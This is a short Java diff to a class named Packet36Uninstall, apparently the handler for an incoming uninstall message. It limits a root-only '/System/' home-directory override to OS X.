@@ -29,7 +29,7 @@ public class Packet36Uninstall extends AbstractIncomingPacket {
 			
 			String home = System.getProperty("user.home");
 			
-			if (Utils.isRoot()) {
+			if (Utils.isRoot() && OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 				home = "/System/";
 			}
 
